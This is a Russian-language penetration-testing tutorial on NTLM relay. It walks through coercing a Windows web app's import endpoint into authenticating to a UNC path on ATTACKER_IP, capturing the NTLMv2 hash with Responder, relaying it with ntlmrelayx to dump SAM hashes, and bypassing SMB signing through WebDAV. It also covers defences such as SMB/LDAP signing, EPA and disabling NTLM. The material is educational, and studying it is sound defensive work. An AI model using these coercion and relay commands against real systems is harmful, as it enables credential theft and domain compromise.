## Вопрос, с которого всё начинается

Веб-приложение на Windows-сервере умеет читать файлы по UNC-пути (`\\server\share`). Что если заставить его обратиться к **нашему** серверу? Тогда Windows-сервис честно предъявит свои NTLM-креды — а мы их перехватим и «переиграем» на другой хост.

Это **NTLM relay** — релей аутентификации. Он соединяет веб-уязвимость (SSRF/XXE/загрузку) с атакой на домен. Сегодня разберём цепочку целиком.

## Наш пример

`files.local` — веб-приложение на Windows. У него есть функция «импорт по ссылке»: сервер сам читает указанный ресурс.

```http
POST /api/import HTTP/1.1
Host: files.local

{"source":"\\\\fileserver\\share\\report.xlsx"}
```

Начнём с проверки: а принимает ли он UNC-путь на **наш** хост? Подставим свой IP:

```bash
$ curl -s -X POST https://files.local/api/import \
>   -d '{"source":"\\\\ATTACKER_IP\\share\\x"}'
```

Если сервер полез читать наш ресурс — он предъявит нам NTLM-аутентификацию. Это первая ступень.

## Шаг 1: coercion — заставляем сервер аутентифицироваться

Приём, которым провоцируют сервер «постучаться» к нам, называют **coercion** (принуждение). Источников много:

- SSRF/импорт по URL, как у нас;
- XXE с внешним DTD на UNC-путь;
- загрузка файла, где парсится встроенная ссылка;
- Word/Excel/PDF-документ с внешней ссылкой на `\\ATTACKER\share`.

Ключ в том, что Windows при обращении к `\\host\share` **автоматически** пытается аутентифицироваться текущим пользователем (учёткой сервиса). Нам не нужен пароль — нужна только эта попытка.

## Шаг 2: Responder ловит хэш

На нашем хосте запускаем **Responder** — утилиту, которая слушает SMB/HTTP и отвечает на NTLM-запросы, собирая хэши:

```bash
$ sudo responder -I eth0 -v
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.15
[SMB] NTLMv2-SSP Username : DOMAIN\svc_web
[SMB] NTLMv2-SSP Hash     : svc_web::DOMAIN:1122334455667788:HASH...
```

Мы получили **NTLMv2-хэш** сервисной учётки. Его можно попробовать разобрать офлайн (`hashcat -m 5600`), но чаще он бесполезен напрямую — NTLMv2 не подходит для «передачи». Зато его можно **релеить**.

## Шаг 3: relay на другой хост

Идея relay: пока сервер ждёт ответа от нас, мы **перенаправляем** его аутентификацию на другой хост, где хотим получить доступ. Это делает `ntlmrelayx`:

```bash
$ impacket-ntlmrelayx -tf targets.txt -smb2support
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Received connection from 10.10.10.15, attacking target smb://10.10.10.20
[*] Authenticating against smb://10.10.10.20 as DOMAIN/svc_web SUCCEED
```

Сервисная учётка успешно аутентифицировалась на `10.10.10.20`. Если у неё есть права администратора там — `ntlmrelayx` сразу дампнёт SAM:

```bash
$ impacket-ntlmrelayx -tf targets.txt -smb2support
[*] Authenticating against smb://10.10.10.20 as DOMAIN/svc_web SUCCEED
[*] Dumping local SAM hashes
Administrator:500:aad3b...:HASH...
```

Вот и pivot: веб-уязвимость → релей → хэши другого хоста.

## Шаг 4: WebDAV и EPA

Релей в SMB часто блокируется подписью (`SMB Signing: required`). Тогда идут в **WebDAV** (HTTP), где подписи нет:

```bash
$ impacket-ntlmrelayx -t http://10.10.10.30/ -smb2support
```

Сервер жертвы по UNC-пути `\\ATTACKER@80\path` обратится к нам по HTTP, и мы релеим на WebDAV-хост. Ещё одна защита — **EPA** (Extended Protection for Authentication), которая привязывает аутентификацию к TLS-каналу; если EPA выключен (по умолчанию во многих настройках), релей проходит. Проверяй, включены ли SMB signing, LDAP signing и EPA — это и есть защита от класса.

## Полный прогон от начала до конца

Проверяем `/api/import`: он читает UNC-пути. Подставляем свой IP — сервер стучится к нам. Запускаем Responder — видим NTLMv2-хэш `svc_web`. Запускаем `ntlmrelayx` — релеим на соседний хост `10.10.10.20`. Получаем дамп SAM. Из веб-уязвимости выросла компрометация соседнего сервера. В отчёт идёт вся цепочка: запрос, хэш, релей, дамп.

## Инструменты

Основной набор — из Impacket: **Responder** (перехват), **ntlmrelayx** (релей), **smbserver** (быстрый SMB). Для coercion пригодится `PetitPotam`/`PrinterBug`, если веб-вектор не сработал. Слушать обращения удобно `nc`/`tcpdump`, а смотреть, куда релейнуть, — `netexec` (`nxc smb`) по списку хостов. Все действия — только в рамках авторизованного теста: релей затрагивает чужие учётки, поэтому не запускай его по боевым хостам без согласования.

## Защита

Класс закрывается несколькими настройками: включить **SMB signing** и **LDAP signing**, включить **EPA** (Extended Protection for Authentication), отключить NTLM там, где можно (перейти на Kerberos), ограничить исходящие SMB/HTTP с серверов и заблокировать coercion-порты (EFSRPC, Print Spooler). В вебе — не давать приложению читать произвольные внешние ресурсы (никаких UNC и «любых URL»), валидировать схему и хост. Защита многослойная: одного signing недостаточно, если включён WebDAV.

## Если не сработало

Если сервер не стучится к тебе по UNC, попробуй другие схемы: `file://`, `http://ATTACKER/`, а также `@` в URL. Если SMB-релей блокируется подписью, переходи на **WebDAV** (HTTP) или LDAP. Если coercion-точка закрыта, поищи другую: XXE, импорт документа, парсер Word/Excel. И помни: релей требует, чтобы у жертвы была **права** на целевом хосте; если нет — эффекта не будет, но сам факт релея всё равно важен.

## Как оформить находку

Покажи всю цепочку: запрос, которым ты заставил сервер обратиться к тебе; вывод Responder с хэшем; вывод `ntlmrelayx` с успешной аутентификацией на цели; дамп, если получился. Подчеркни, что релей сработал из-за отсутствия signing/EPA. Это классический «веб → домен» путь, и он высоко ценится в пентесте.

## Где это встречается в реальности

Класс живёт на внутренних пентестах Windows-инфраструктуры: веб-приложения на IIS/ASP.NET, функции «импорт по ссылке», генерация PDF/Excel, парсинг документов. Если сервер может обращаться к внешним ресурсам по UNC — это потенциальная coercion-точка. Особенно ценно в связке с другими багами: одна веб-уязвимость превращается в компрометацию соседних хостов и движение к домену.

## Частые вопросы

**«Обязательно ли Windows?»** Да, NTLM — протокол Windows-аутентификации. Класс актуален на внутренних пентестах с Windows-инфраструктурой.

**«Почему хэш не удаётся "передать" напрямую?»** NTLMv2 нельзя использовать как pass-the-hash. Зато его можно **релеить** — перенаправить аутентификацию на другой хост, пока сессия активна.

## Что мы теперь знаем

- Windows автоматически аутентифицируется при обращении к `\\host\share`.
- Веб-функция (импорт, XXE, загрузка) может «принудить» сервер к этой аутентификации.
- Responder собирает NTLMv2-хэш.
- `ntlmrelayx` перенаправляет аутентификацию на другой хост.
- SMB signing, LDAP signing и EPA — защита; WebDAV — обход отсутствия SMB signing.
- Coercion может идти не только из SSRF, но и из XXE и парсинга документов.
- Релей даёт доступ только там, где у жертвы есть права.
- Отключение NTLM в пользу Kerberos закрывает класс целиком.

## На что смотреть дальше

- Ищи в вебе всё, что читает внешний ресурс: импорт, превью, XXE, документы.
- Пробуй UNC-путь `\\ATTACKER\share` — если сервер стучится, coercion работает.
- Проверяй, включены ли SMB/LDAP signing и EPA на целевых хостах.
- Помни: релей — это путь от веба к домену; в связке с другими багами импакт максимален.
